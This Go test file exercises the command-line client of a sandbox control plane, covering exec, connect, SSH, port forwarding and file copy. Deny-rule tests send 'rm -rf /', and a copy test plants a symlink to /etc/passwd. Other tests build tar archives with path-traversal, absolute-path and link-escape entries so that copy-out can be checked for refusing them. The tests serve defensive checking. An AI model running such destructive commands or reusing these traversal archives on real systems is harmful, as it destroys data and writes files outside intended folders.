package sandboxcli

import (
	"archive/tar"
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/knownhosts"

	"github.com/zybuu-ai/abhed/controlplane"
	"github.com/zybuu-ai/abhed/driver"
	"github.com/zybuu-ai/abhed/profiles"
)

func decode[T any](t *testing.T, res result) T {
	t.Helper()
	var v T
	if err := json.Unmarshal([]byte(res.out), &v); err != nil {
		t.Fatalf("decode %q: %v", res.out, err)
	}
	return v
}

// ready makes a sandbox with the CLI and waits until it is Ready.
func (r *rig) ready(t *testing.T, args ...string) controlplane.Sandbox {
	t.Helper()
	res := r.must(t, append([]string{"create", "-wait", "-o", "json"}, args...)...)
	sb := decode[controlplane.Sandbox](t, res)
	if sb.State != controlplane.StateReady {
		t.Fatalf("not ready: %+v", sb)
	}
	return sb
}

func TestTemplatesAndObjects(t *testing.T) {
	r := newRig(t)
	// Templates: only an administrator makes them.
	if res := r.run(t, "template", "create", "web", "-l", "team=a", "-min-tier", "process", "-set", "exec.timeout_seconds=60"); res.code != ExitAuth {
		t.Fatalf("alice made a template: %+v", res)
	}
	r.must(t, "template", "create", "web", "-profile", "admin", "-description", "web apps", "-driver", "process",
		"-l", "team=a", "-min-tier", "process", "-set", "exec.timeout_seconds=60")
	r.must(t, "template", "create", "batch", "-profile", "admin", "-l", "team=b")
	if l := decode[templateList](t, r.must(t, "template", "list", "-l", "team=a", "-o", "json")); len(l.Items) != 1 || l.Items[0].Name != "web" {
		t.Fatalf("template list: %+v", l)
	}
	if res := r.must(t, "template", "get", "web"); !strings.Contains(res.out, "exec.timeout_seconds=60") || !strings.Contains(res.out, "web apps") {
		t.Fatalf("template get: %s", res.out)
	}
	if res := r.run(t, "template", "get", "nope"); res.code != ExitNotFound {
		t.Fatalf("a missing template: %+v", res)
	}

	// A sandbox from a template, with labels and settings of its own.
	sb := r.ready(t, "-template", "web", "-l", "app=shop", "-set", "exec.timeout_seconds=30")
	if sb.Labels["team"] != "a" || sb.Labels["app"] != "shop" || sb.Settings["exec.timeout_seconds"] != "30" ||
		sb.Settings[controlplane.SetMinTier] != "process" || sb.Template != "web" || sb.Tier != "process" {
		t.Fatalf("from the template: %+v", sb)
	}
	if res := r.run(t, "create", "-template", "web", "-set", "exec.timeout_seconds=600"); res.code != ExitFailed ||
		!strings.Contains(res.err, "looser") {
		t.Fatalf("a looser setting than the template's: %+v", res)
	}
	if res := r.run(t, "create", "-template", "nope"); res.code != ExitNotFound || !strings.Contains(res.err, "template list") {
		t.Fatalf("an unknown template: %+v", res)
	}
	other := r.ready(t, "-l", "team=b", "-min-tier", "process")

	// list: selectors, state, paging.
	if l := decode[sandboxList](t, r.must(t, "list", "-l", "team=a", "-o", "json")); len(l.Items) != 1 || l.Items[0].ID != sb.ID {
		t.Fatalf("list -l team=a: %+v", l)
	}
	if l := decode[sandboxList](t, r.must(t, "list", "-l", "team in (a,b)", "-state", "Ready", "-o", "json")); len(l.Items) != 2 {
		t.Fatalf("list in: %+v", l)
	}
	res := r.must(t, "list", "-limit", "1")
	if !strings.Contains(res.err, "more: -after ") || strings.Count(res.out, "sbx_") != 1 || !strings.Contains(res.out, "STATE") {
		t.Fatalf("one page: %+v", res)
	}
	if l := decode[sandboxList](t, r.must(t, "list", "-limit", "1", "-all", "-o", "json")); len(l.Items) != 2 || l.Next != "" {
		t.Fatalf("every page: %+v", l)
	}
	if res := r.run(t, "list", "-l", "team in"); res.code != ExitUsage {
		t.Fatalf("a bad selector: %+v", res)
	}
	if res := r.run(t, "list", "-o", "yaml"); res.code != ExitUsage || !strings.Contains(res.err, "-o json") {
		t.Fatalf("yaml: %+v", res)
	}

	// get and update, the update guarded by If-Match.
	if res := r.must(t, "get", sb.ID); !strings.Contains(res.out, "State:") || !strings.Contains(res.out, "Ready") {
		t.Fatalf("get: %s", res.out)
	}
	if res := r.run(t, "get", "sbx_0000000000000000"); res.code != ExitNotFound {
		t.Fatalf("a missing sandbox: %+v", res)
	}
	up := decode[controlplane.Sandbox](t, r.must(t, "update", sb.ID, "-l", "env=dev", "-unlabel", "app", "-o", "json"))
	if up.Labels["env"] != "dev" || up.Labels["app"] != "" || up.Labels["team"] != "a" {
		t.Fatalf("update: %+v", up.Labels)
	}
	if res := r.run(t, "update", sb.ID, "-l", "env=prod", "-if-match", "1"); res.code != ExitConflict || !strings.Contains(res.err, "changed since") {
		t.Fatalf("a stale If-Match: %+v", res)
	}
	if res := r.run(t, "update", sb.ID); res.code != ExitUsage {
		t.Fatalf("an empty update: %+v", res)
	}

	// The record of a sandbox.
	logs := decode[eventsPage](t, r.must(t, "logs", sb.ID, "-o", "json"))
	actions := map[string]bool{}
	for _, ev := range logs.Items {
		actions[ev.Action+":"+ev.Outcome] = true
	}
	if !actions["create:ok"] || !actions["update:ok"] || !actions["reconcile:ok"] {
		t.Fatalf("logs: %v", actions)
	}
	if res := r.must(t, "logs", sb.ID, "-limit", "2"); strings.Count(res.out, "\n") != 3 {
		t.Fatalf("logs -limit 2: %q", res.out)
	}

	// stop, snapshot, restore, start.
	snap := decode[struct {
		Snapshot driver.SnapshotRef `json:"snapshot"`
	}](t, r.must(t, "snapshot", sb.ID, "-name", "s1", "-o", "json"))
	if snap.Snapshot.Digest == "" || snap.Snapshot.Name != "s1" {
		t.Fatalf("snapshot: %+v", snap)
	}
	snapFile := filepath.Join(t.TempDir(), "snap.json")
	b, _ := json.Marshal(map[string]any{"snapshot": snap.Snapshot})
	_ = os.WriteFile(snapFile, b, 0o600)
	if res := r.run(t, "restore", sb.ID, "-f", snapFile); res.code != ExitConflict {
		t.Fatalf("restore while Ready: %+v", res)
	}
	r.must(t, "stop", sb.ID, "-grace", "1")
	r.waitState(t, sb.ID, controlplane.StateStopped)
	r.must(t, "restore", sb.ID, "-f", snapFile)
	r.waitState(t, sb.ID, controlplane.StateReady)
	r.must(t, "stop", sb.ID)
	r.waitState(t, sb.ID, controlplane.StateStopped)
	r.must(t, "restore", sb.ID, snap.Snapshot.ID, "-digest", snap.Snapshot.Digest)
	r.waitState(t, sb.ID, controlplane.StateReady)
	r.must(t, "stop", sb.ID)
	r.waitState(t, sb.ID, controlplane.StateStopped)
	r.must(t, "start", sb.ID)
	r.waitState(t, sb.ID, controlplane.StateReady)
	if res := r.run(t, "start", sb.ID); res.code != ExitConflict {
		t.Fatalf("start while Ready: %+v", res)
	}

	// expose.
	ex := decode[struct {
		URL string `json:"url"`
	}](t, r.must(t, "expose", sb.ID, "8000", "-ttl", "10m", "-o", "json"))
	if !strings.HasPrefix(ex.URL, r.url+"/") {
		t.Fatalf("expose: %+v", ex)
	}

	// delete asks first, and needs -y without a terminal.
	if res := r.run(t, "delete", other.ID); res.code != ExitUsage || !strings.Contains(res.err, "-y") {
		t.Fatalf("delete with no terminal: %+v", res)
	}
	term := &fakeTerm{rows: 24, cols: 80, resized: make(chan struct{})}
	if res := r.runWith(t, runOpts{term: term, in: strings.NewReader("n\n")}, "delete", other.ID); res.code != ExitFailed {
		t.Fatalf("delete refused at the prompt: %+v", res)
	}
	if res := r.runWith(t, runOpts{term: term, in: strings.NewReader("y\n")}, "delete", other.ID); res.code != 0 {
		t.Fatalf("delete confirmed: %+v", res)
	}
	r.must(t, "delete", sb.ID, "-y")
	if res := r.run(t, "template", "rm", "web"); res.code != ExitUsage {
		t.Fatalf("template rm with no terminal: %+v", res)
	}
	if res := r.run(t, "template", "rm", "web", "-y"); res.code != ExitAuth {
		t.Fatalf("alice removed a template: %+v", res)
	}
	r.must(t, "template", "rm", "web", "-y", "-profile", "admin")
	if res := r.run(t, "template", "get", "web"); res.code != ExitNotFound {
		t.Fatalf("after rm: %+v", res)
	}
}

func (r *rig) waitState(t *testing.T, id string, want controlplane.State) {
	t.Helper()
	deadline := time.Now().Add(10 * time.Second)
	for {
		sb, err := r.store.Get(context.Background(), id)
		if err == nil && sb.State == want {
			return
		}
		if time.Now().After(deadline) {
			t.Fatalf("%s: %s, not %s", id, sb.State, want)
		}
		r.svc.Kick(id)
		time.Sleep(20 * time.Millisecond)
	}
}

func TestExec(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	if res := r.must(t, "exec", sb.ID, "--", "echo", "-n", "hi"); res.out != "echo -n hi\n" {
		t.Fatalf("exec: %+v", res)
	}
	// Without --, flags after the command are the command's.
	if res := r.must(t, "exec", sb.ID, "ls", "-la"); res.out != "ls -la\n" {
		t.Fatalf("exec without --: %+v", res)
	}
	if res := r.must(t, "exec", "-c", "echo $HOME", sb.ID); res.out != "echo $HOME\n" {
		t.Fatalf("exec -c: %+v", res)
	}
	r.fake.ExecFunc = func(_ context.Context, _ string, req driver.ExecRequest) (driver.ExecResult, error) {
		_, _ = io.WriteString(req.Stdout, "out\n")
		_, _ = io.WriteString(req.Stderr, "err\n")
		if req.Stdin != nil {
			b, _ := io.ReadAll(req.Stdin)
			_, _ = io.WriteString(req.Stdout, "stdin="+string(b)+"\n")
		}
		return driver.ExecResult{ExitCode: 3}, nil
	}
	res := r.run(t, "exec", sb.ID, "--", "false")
	if res.code != 3 || res.out != "out\n" || res.err != "err\n" {
		t.Fatalf("the exit status: %+v", res)
	}
	// -i: stdin over the WebSocket.
	res = r.runWith(t, runOpts{in: strings.NewReader("from the person")}, "exec", "-i", sb.ID, "--", "cat")
	if res.code != 3 || res.out != "out\nstdin=from the person\n" || res.err != "err\n" {
		t.Fatalf("exec -i: %+v", res)
	}
	// Flags may follow the id; the command starts after them.
	res = r.runWith(t, runOpts{in: strings.NewReader("x")}, "exec", sb.ID, "-i", "--", "cat", "-n")
	if res.code != 3 || res.out != "out\nstdin=x\n" {
		t.Fatalf("exec ID -i: %+v", res)
	}
	// The server's deny rules hold, on both paths, and nothing runs.
	execs := r.fake.Calls("exec")
	for _, args := range [][]string{{"exec", sb.ID, "--", "rm", "-rf", "/"}, {"exec", "-i", sb.ID, "--", "rm", "-rf", "/"}} {
		if res := r.run(t, args...); res.code != ExitAuth || !strings.Contains(res.err, "denied") {
			t.Fatalf("%v: %+v", args, res)
		}
	}
	if r.fake.Calls("exec") != execs {
		t.Fatal("a refused command ran")
	}
	if res := r.run(t, "exec", sb.ID); res.code != ExitUsage {
		t.Fatalf("exec with no command: %+v", res)
	}
	if res := r.run(t, "exec", "sbx_0000000000000000", "--", "true"); res.code != ExitNotFound {
		t.Fatalf("exec in no sandbox: %+v", res)
	}
}

func TestConnect(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	// An interactive shell: raw mode, the size at start and on change, the
	// lines judged, and the shell's exit status passed on.
	term := &fakeTerm{rows: 24, cols: 80, resized: make(chan struct{}, 1)}
	pr, pw := io.Pipe()
	out := &syncBuffer{}
	done := make(chan result, 1)
	go func() { done <- r.runWith(t, runOpts{in: pr, term: term, out: out}, "connect", sb.ID) }()
	out.wait(t, "$ ")
	_, _ = pw.Write([]byte("echo hi\r"))
	out.wait(t, "echo hi")
	term.resize(30, 100)
	out.wait(t, "size 30x100")
	_, _ = pw.Write([]byte("rm -rf /\r"))
	out.wait(t, "Denied")
	_, _ = pw.Write([]byte("exit\r"))
	res := <-done
	if res.code != 7 {
		t.Fatalf("the shell's status: %+v", res)
	}
	if term.raw != 0 {
		t.Fatal("the terminal was left in raw mode")
	}
	if ev := r.audit(t, sb.ID, "attach"); ev.Detail["rows"] != "24" || ev.Detail["cols"] != "80" {
		t.Fatalf("attach record %+v", ev)
	}
	// What the shell wrote reaches the record; printed back, it cannot
	// drive the terminal.
	logs := r.must(t, "logs", sb.ID)
	if strings.ContainsAny(logs.out, "\r\x1b") || !strings.Contains(logs.out, `size 30x100\n`) {
		t.Fatalf("logs printed raw control characters: %q", logs.out)
	}
	// Ctrl-] leaves; what came before it is sent.
	res = r.runWith(t, runOpts{in: io.MultiReader(strings.NewReader("ab"), slowReader{"\x1dcd"})}, "connect", sb.ID)
	if res.code != 0 || !strings.Contains(res.err, "left the session") || strings.Contains(res.out, "cd") {
		t.Fatalf("escape: %+v", res)
	}
	if res := r.run(t, "connect", sb.ID, "-escape", "x"); res.code != ExitUsage {
		t.Fatalf("a bad escape: %+v", res)
	}
}

// slowReader returns its text after a pause, so what came before it is read first.
type slowReader struct{ s string }

func (s slowReader) Read(p []byte) (int, error) {
	time.Sleep(200 * time.Millisecond)
	return copy(p, s.s), io.EOF
}

func (r *rig) audit(t *testing.T, id, action string) controlplane.AuditEvent {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for {
		evs, _ := r.store.AuditFor(context.Background(), id)
		for i := len(evs) - 1; i >= 0; i-- {
			if evs[i].Action == action && evs[i].Outcome == controlplane.OutcomeOK {
				return evs[i]
			}
		}
		if time.Now().After(deadline) {
			t.Fatalf("no %s in %+v", action, evs)
		}
		time.Sleep(20 * time.Millisecond)
	}
}

func TestForward(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	ctx, cancel := context.WithCancel(context.Background())
	addrs := make(chan net.Addr, 1)
	done := make(chan result, 1)
	go func() {
		done <- r.runWith(t, runOpts{ctx: ctx, listen: func(a net.Addr) { addrs <- a }}, "forward", sb.ID, "0:5432")
	}()
	var addr net.Addr
	select {
	case addr = <-addrs:
	case res := <-done:
		t.Fatalf("forward ended: %+v", res)
	}
	if ip := addr.(*net.TCPAddr).IP; !ip.IsLoopback() {
		t.Fatalf("listening on %s", addr)
	}
	for range 2 {
		c, err := net.Dial("tcp", addr.String())
		if err != nil {
			t.Fatal(err)
		}
		_, _ = c.Write([]byte("hello"))
		buf := make([]byte, 5)
		_ = c.SetReadDeadline(time.Now().Add(5 * time.Second))
		if _, err := io.ReadFull(c, buf); err != nil || string(buf) != "hello" {
			t.Fatalf("through the forward: %q %v", buf, err)
		}
		_ = c.Close()
	}
	cancel()
	if res := <-done; res.code != 0 || !strings.Contains(res.out, "Forwarding 127.0.0.1:") {
		t.Fatalf("forward's end: %+v", res)
	}
	// Each connection was its own stream, opened as alice.
	evs, _ := r.store.AuditFor(context.Background(), sb.ID)
	opened := 0
	for _, ev := range evs {
		if ev.Action == "forward" && ev.Outcome == controlplane.OutcomeRequested && ev.Principal == "alice" && ev.Detail["port"] == "5432" {
			opened++
		}
	}
	if opened != 2 {
		t.Fatalf("forward streams opened: %d in %+v", opened, evs)
	}
	// Anything but loopback is said out loud before it listens.
	res := r.run(t, "forward", sb.ID, "8080:80", "-address", "192.0.2.1")
	if !strings.Contains(res.err, "not loopback") {
		t.Fatalf("a wide address: %+v", res)
	}
	if res := r.run(t, "forward", sb.ID, "99999"); res.code != ExitUsage {
		t.Fatalf("a bad port: %+v", res)
	}
}

func TestSSH(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	r.sshExit = 42
	res := r.run(t, "ssh", sb.ID, "--", "uname", "-a")
	if res.code != 42 {
		t.Fatalf("ssh's status: %+v", res)
	}
	args := strings.Join(r.sshArgs, "\n")
	alias := "abhed-" + sb.ID
	for _, want := range []string{
		"StrictHostKeyChecking=yes", "UserKnownHostsFile=" + r.knownHosts, "HostKeyAlias=" + alias,
		"ProxyCommand='/opt/abhed tools/abhed' sandbox connect --stdio -profile alice " + sb.ID,
		"-l\nsandbox", alias + "\nuname\n-a",
	} {
		if !strings.Contains(args, want) {
			t.Errorf("ssh arguments lack %q:\n%s", want, args)
		}
	}
	if strings.Contains(strings.ToLower(args), "stricthostkeychecking=no") || strings.Contains(args, "/dev/null") {
		t.Fatalf("host keys unchecked:\n%s", args)
	}
	kh, err := os.ReadFile(r.knownHosts)
	if err != nil || !strings.HasPrefix(string(kh), alias+" ssh-ed25519 ") {
		t.Fatalf("known_hosts %q %v", kh, err)
	}
	if fi, _ := os.Stat(r.knownHosts); fi.Mode().Perm() != 0o600 {
		t.Fatalf("known_hosts mode %o", fi.Mode().Perm())
	}
	// Again: the line for the sandbox is replaced, not repeated.
	r.sshExit = 0
	r.must(t, "ssh", sb.ID)
	if kh, _ := os.ReadFile(r.knownHosts); strings.Count(string(kh), alias) != 1 {
		t.Fatalf("known_hosts after a second ssh: %q", kh)
	}

	// The ProxyCommand end carries an SSH client that checks the host key
	// against that file.
	hostKeys, err := knownhosts.New(r.knownHosts)
	if err != nil {
		t.Fatal(err)
	}
	client := sshThroughProxy(t, r, sb.ID, alias, hostKeys)
	s, err := client.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	out, err := s.Output("echo via-ssh")
	if err != nil || string(out) != "echo via-ssh\n" {
		t.Fatalf("over ssh: %q %v", out, err)
	}
	_ = client.Close()
	// A host key other than the one the server gave is refused.
	other, _ := ssh.NewSignerFromKey(mustKey(t))
	wrong := ssh.FixedHostKey(other.PublicKey())
	if c, err := sshClientErr(t, r, sb.ID, alias, wrong); err == nil {
		_ = c.Close()
		t.Fatal("a wrong host key was accepted")
	}

	// ssh-config: a block per Ready sandbox, strict host key checking.
	cfg := r.must(t, "ssh-config")
	for _, want := range []string{"Host " + alias, "ProxyCommand '/opt/abhed tools/abhed' sandbox connect --stdio -profile alice " + sb.ID,
		"StrictHostKeyChecking yes", "UserKnownHostsFile \"" + r.knownHosts + "\"", "User sandbox"} {
		if !strings.Contains(cfg.out, want) {
			t.Errorf("ssh-config lacks %q:\n%s", want, cfg.out)
		}
	}
	hosts := decode[[]sshHost](t, r.must(t, "ssh-config", sb.ID, "-o", "json"))
	if len(hosts) != 1 || hosts[0].Host != alias {
		t.Fatalf("ssh-config -o json: %+v", hosts)
	}
	if res := r.run(t, "ssh-config", "-l", "nope=x"); res.code != 0 || strings.Contains(res.out, "Host ") {
		t.Fatalf("ssh-config for no sandbox: %+v", res)
	}
}

func mustKey(t *testing.T) any {
	t.Helper()
	_, k, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	return k
}

// sshThroughProxy runs the ProxyCommand's end in this process and an SSH
// client over its stdin and stdout.
func sshThroughProxy(t *testing.T, r *rig, id, alias string, hostKeys ssh.HostKeyCallback) *ssh.Client {
	t.Helper()
	c, err := sshClientErr(t, r, id, alias, hostKeys)
	if err != nil {
		t.Fatal(err)
	}
	return c
}

func sshClientErr(t *testing.T, r *rig, id, alias string, hostKeys ssh.HostKeyCallback) (*ssh.Client, error) {
	t.Helper()
	toProxy, fromClient := io.Pipe()
	fromProxy, toClient := io.Pipe()
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan int, 1)
	go func() {
		env := r.env(runOpts{ctx: ctx, in: toProxy})
		env.Out = toClient
		done <- Main(env, []string{"connect", "--stdio", "-profile", "alice", id})
		_ = toClient.Close()
	}()
	t.Cleanup(func() {
		cancel()
		_ = fromClient.Close()
		_ = fromProxy.Close()
		select {
		case <-done:
		case <-time.After(10 * time.Second):
			t.Error("the ProxyCommand end did not stop")
		}
	})
	cc, chans, reqs, err := ssh.NewClientConn(pipeConn{Reader: fromProxy, WriteCloser: fromClient}, alias+":22",
		&ssh.ClientConfig{User: "sandbox", HostKeyCallback: hostKeys, Timeout: 5 * time.Second})
	if err != nil {
		return nil, err
	}
	return ssh.NewClient(cc, chans, reqs), nil
}

func TestCopy(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	src := filepath.Join(t.TempDir(), "proj")
	_ = os.MkdirAll(filepath.Join(src, "sub"), 0o755)
	_ = os.MkdirAll(filepath.Join(src, ".abhed"), 0o755)
	_ = os.WriteFile(filepath.Join(src, "a.txt"), []byte("alpha"), 0o644)
	_ = os.WriteFile(filepath.Join(src, "sub", "b.txt"), []byte("beta"), 0o644)
	_ = os.WriteFile(filepath.Join(src, ".abhed", "secret"), []byte("state"), 0o600)
	_ = os.Symlink("/etc/passwd", filepath.Join(src, "out-link"))
	res := r.must(t, "cp", src, sb.ID+":work")
	if !strings.Contains(res.out, "1 links, sockets or devices and 1 .abhed (Abhed's state, never copied) left out") {
		t.Fatalf("cp in: %+v", res)
	}
	dst := t.TempDir()
	r.must(t, "cp", sb.ID+":work", dst)
	for name, want := range map[string]string{"proj/a.txt": "alpha", "proj/sub/b.txt": "beta"} {
		if b, err := os.ReadFile(filepath.Join(dst, name)); err != nil || string(b) != want {
			t.Errorf("%s: %q %v", name, b, err)
		}
	}
	for _, gone := range []string{"proj/.abhed", "proj/out-link"} {
		if _, err := os.Lstat(filepath.Join(dst, gone)); err == nil {
			t.Errorf("%s was copied", gone)
		}
	}
	// A file that is there already is not overwritten.
	if res := r.run(t, "cp", sb.ID+":work", dst); res.code != ExitFailed {
		t.Fatalf("over existing files: %+v", res)
	}
	if b, _ := os.ReadFile(filepath.Join(dst, "proj/a.txt")); string(b) != "alpha" {
		t.Fatal("a file was overwritten")
	}
	// One file.
	r.must(t, "cp", filepath.Join(src, "a.txt"), sb.ID+":one")
	one := t.TempDir()
	r.must(t, "cp", sb.ID+":one", one)
	if b, _ := os.ReadFile(filepath.Join(one, "a.txt")); string(b) != "alpha" {
		t.Fatalf("one file: %q", b)
	}

	// A local folder that is not there is named, not a bare stat error.
	if res := r.run(t, "cp", sb.ID+":one", filepath.Join(one, "missing")); res.code != ExitUsage || !strings.Contains(res.err, "does not exist") {
		t.Fatalf("into a missing folder: %+v", res)
	}

	// What the arguments may name.
	for _, args := range [][]string{
		{"cp", src, dst}, {"cp", sb.ID + ":a", sb.ID + ":b"}, {"cp", filepath.Join(src, ".abhed", "secret"), sb.ID + ":x"},
		{"cp", src, sb.ID + ":.abhed"}, {"cp", sb.ID + ":work", filepath.Join(dst, ".abhed")}, {"cp", sb.ID + ":.ABHED/x", dst},
		{"cp", filepath.Join(src, "out-link"), sb.ID + ":x"}, {"cp", sb.ID + ":", dst},
	} {
		if res := r.run(t, args...); res.code != ExitUsage {
			t.Errorf("%v: %+v", args, res)
		}
	}
}

// A sandbox's archive is untrusted: nothing in it lands outside the
// folder it is copied into, or in Abhed's state.
func TestCopyOutRefusesEscapes(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	type entry struct {
		name, link string
		typ        byte
	}
	evil := map[string][]entry{
		"dotdot":    {{name: "../escaped", typ: tar.TypeReg}},
		"absolute":  {{name: "/tmp/abhedtest-escaped", typ: tar.TypeReg}},
		"state":     {{name: "proj/.abhed/config.json", typ: tar.TypeReg}},
		"stateCase": {{name: ".Abhed/x", typ: tar.TypeReg}},
		"linkOut":   {{name: "l", link: "../..", typ: tar.TypeSymlink}},
		"linkAbs":   {{name: "l", link: "/etc", typ: tar.TypeSymlink}},
		"through":   {{name: "d", link: ".", typ: tar.TypeSymlink}, {name: "d/../../escaped", typ: tar.TypeReg}},
		"hardOut":   {{name: "h", link: "../escaped", typ: tar.TypeLink}},
		"device":    {{name: "dev", typ: tar.TypeChar}},
		"linkState": {{name: "s", link: "sub/../.abhed/config.json", typ: tar.TypeSymlink}},
	}
	parent := t.TempDir()
	for name, entries := range evil {
		var buf bytes.Buffer
		tw := tar.NewWriter(&buf)
		for _, e := range entries {
			h := &tar.Header{Name: e.name, Typeflag: e.typ, Linkname: e.link, Mode: 0o644}
			if e.typ == tar.TypeReg {
				h.Size = 4
			}
			_ = tw.WriteHeader(h)
			if e.typ == tar.TypeReg {
				_, _ = tw.Write([]byte("evil"))
			}
		}
		_ = tw.Close()
		// The fake driver keeps what is copied in as it was sent.
		if err := r.fake.CopyIn(context.Background(), sb.ID, name, &buf); err != nil {
			t.Fatal(err)
		}
		dst := filepath.Join(parent, name)
		_ = os.MkdirAll(dst, 0o755)
		res := r.run(t, "cp", sb.ID+":"+name, dst)
		refused := false
		for _, why := range []string{"climbs out", "Abhed's state", "not a relative path", "outside the folder", "not restored"} {
			refused = refused || strings.Contains(res.err, why)
		}
		if res.code != ExitFailed || !refused {
			t.Errorf("%s: %+v", name, res)
		}
	}
	if _, err := os.Lstat(filepath.Join(parent, "escaped")); err == nil {
		t.Fatal("an entry escaped the folder")
	}
	if _, err := os.Lstat("/tmp/abhedtest-escaped"); err == nil {
		_ = os.Remove("/tmp/abhedtest-escaped")
		t.Fatal("an absolute entry was written")
	}
	for _, name := range []string{"state/proj/.abhed", "stateCase/.Abhed"} {
		if _, err := os.Lstat(filepath.Join(parent, name)); err == nil {
			t.Errorf("%s was written", name)
		}
	}
}

// A copy out that fails part way leaves no empty folder it made behind,
// and keeps what was there before.
func TestFailedCopyOutRemovesTheEmptyFolderItMade(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	_ = tw.WriteHeader(&tar.Header{Name: "w2/", Typeflag: tar.TypeDir, Mode: 0o755})
	_ = tw.WriteHeader(&tar.Header{Name: "w2/sub/", Typeflag: tar.TypeDir, Mode: 0o755})
	_ = tw.WriteHeader(&tar.Header{Name: "w2/etc", Typeflag: tar.TypeSymlink, Linkname: "/etc"})
	_ = tw.Close()
	if err := r.fake.CopyIn(context.Background(), sb.ID, "w2", &buf); err != nil {
		t.Fatal(err)
	}
	dst := t.TempDir()
	_ = os.Mkdir(filepath.Join(dst, "kept"), 0o755)
	if res := r.run(t, "cp", sb.ID+":w2", dst); res.code != ExitFailed {
		t.Fatalf("a link out was copied: %+v", res)
	}
	if _, err := os.Lstat(filepath.Join(dst, "w2")); err == nil {
		t.Fatal("the failed copy left the empty folder it made")
	}
	if _, err := os.Stat(filepath.Join(dst, "kept")); err != nil {
		t.Fatalf("a folder that was there before was removed: %v", err)
	}
}

// A mutating call whose answer is lost is sent again under the same
// Idempotency-Key, and the server acts once.
func TestIdempotentRetry(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	var mu sync.Mutex
	keys := map[string][]string{}
	drop := map[string]bool{"POST /v1/sandboxes": true, "POST /v1/sandboxes/" + sb.ID + ":exec": true}
	r.setWrap(func(w http.ResponseWriter, req *http.Request, next http.Handler) bool {
		k := req.Method + " " + req.URL.Path
		mu.Lock()
		keys[k] = append(keys[k], req.Header.Get("Idempotency-Key"))
		dropIt := drop[k]
		drop[k] = false
		mu.Unlock()
		if !dropIt {
			return false
		}
		// The server acts, then the answer is lost on the way back.
		next.ServeHTTP(&discard{h: http.Header{}}, req)
		conn, _, err := http.NewResponseController(w).Hijack()
		if err == nil {
			_ = conn.Close()
		}
		return true
	})
	made := decode[controlplane.Sandbox](t, r.must(t, "create", "-l", "retry=yes", "-o", "json"))
	k := keys["POST /v1/sandboxes"]
	if len(k) != 2 || k[0] == "" || k[0] != k[1] {
		t.Fatalf("create keys %q", k)
	}
	if l := decode[sandboxList](t, r.must(t, "list", "-l", "retry=yes", "-o", "json")); len(l.Items) != 1 || l.Items[0].ID != made.ID {
		t.Fatalf("the retried create made %d sandboxes", len(l.Items))
	}
	r.fake.ExecFunc = func(_ context.Context, _ string, req driver.ExecRequest) (driver.ExecResult, error) {
		_, _ = io.WriteString(req.Stdout, "ran\n")
		return driver.ExecResult{ExitCode: 4}, nil
	}
	execs := r.fake.Calls("exec")
	if res := r.run(t, "exec", sb.ID, "--", "once"); res.code != 4 {
		t.Fatalf("the retried exec: %+v", res)
	}
	k = keys["POST /v1/sandboxes/"+sb.ID+":exec"]
	if len(k) != 2 || k[0] != k[1] || r.fake.Calls("exec") != execs+1 {
		t.Fatalf("exec keys %q, ran %d times", k, r.fake.Calls("exec")-execs)
	}
	// Two separate commands carry different keys.
	r.must(t, "stop", sb.ID)
	r.waitState(t, sb.ID, controlplane.StateStopped)
	r.must(t, "start", sb.ID)
	if a, b := keys["POST /v1/sandboxes/"+sb.ID+":stop"], keys["POST /v1/sandboxes/"+sb.ID+":start"]; a[0] == b[0] {
		t.Fatal("two calls shared a key")
	}
}

// discard is a response nobody reads.
type discard struct{ h http.Header }

func (d *discard) Header() http.Header         { return d.h }
func (d *discard) Write(p []byte) (int, error) { return len(p), nil }
func (d *discard) WriteHeader(int)             {}
func (d *discard) Flush()                      {}

// A token the server no longer takes is refreshed once and the call sent
// again, for plain calls and streams alike; the new token is kept.
func TestRefreshOn401(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	stale := func() {
		f, _ := profiles.Load(r.profiles)
		p := f.Profiles["alice"]
		p.Token, p.RefreshToken, p.TokenEndpoint = "tok-stale-0001", "refresh-1", r.url+"/test/token"
		p.ExpiresAt, p.IssuedAt = time.Now().Add(time.Hour), time.Now()
		_ = profiles.Save(r.profiles, f)
	}
	stale()
	r.must(t, "get", sb.ID)
	f, _ := profiles.Load(r.profiles)
	if f.Profiles["alice"].Token != freshToken {
		t.Fatal("the refreshed token was not kept")
	}
	stale()
	if res := r.runWith(t, runOpts{in: strings.NewReader("x")}, "exec", "-i", sb.ID, "--", "cat"); res.code != 0 || res.out != "cat\nx" {
		t.Fatalf("exec -i after a refresh: %+v", res)
	}
	// With nothing to refresh with, the person is told to sign in.
	f, _ = profiles.Load(r.profiles)
	f.Profiles["alice"].Token, f.Profiles["alice"].RefreshToken = "tok-stale-0001", ""
	_ = profiles.Save(r.profiles, f)
	if res := r.run(t, "list"); res.code != ExitAuth {
		t.Fatalf("a refused token: %+v", res)
	}
	f.Profiles["alice"].Token = ""
	_ = profiles.Save(r.profiles, f)
	if res := r.run(t, "list"); res.code != ExitAuth || !strings.Contains(res.err, "abhed login") {
		t.Fatalf("signed out: %+v", res)
	}
}

func TestProfileChoice(t *testing.T) {
	r := newRig(t)
	if res := r.must(t, "list", "-server", r.url+"/"); !strings.Contains(res.out, "STATE") {
		t.Fatalf("-server: %+v", res)
	}
	if res := r.run(t, "list", "-server", "https://other.example"); res.code != ExitAuth || !strings.Contains(res.err, "abhed login https://other.example") {
		t.Fatalf("an unknown server: %+v", res)
	}
	if res := r.run(t, "list", "-profile", "nope"); res.code != ExitAuth {
		t.Fatalf("an unknown profile: %+v", res)
	}
}

